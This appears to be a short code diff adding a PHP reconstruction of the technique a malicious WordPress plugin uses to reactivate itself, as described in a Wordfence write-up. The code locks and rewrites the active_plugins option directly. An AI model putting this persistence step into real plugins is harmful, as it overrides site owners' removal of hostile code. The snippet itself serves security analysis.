@@ -1,0 +1,6 @@
+<?php
+// Reconstruction of the self-reactivation in Wordfence's write-up (2026-09).
+$wpdb->query('START TRANSACTION');
+$list = $wpdb->get_var("SELECT option_value FROM {$table} WHERE option_name = 'active_plugins' LIMIT 1 FOR UPDATE");
+$wpdb->query($wpdb->prepare("UPDATE {$table} SET option_value = %s WHERE option_name = 'active_plugins'", $serialized));
+$wpdb->query('COMMIT');
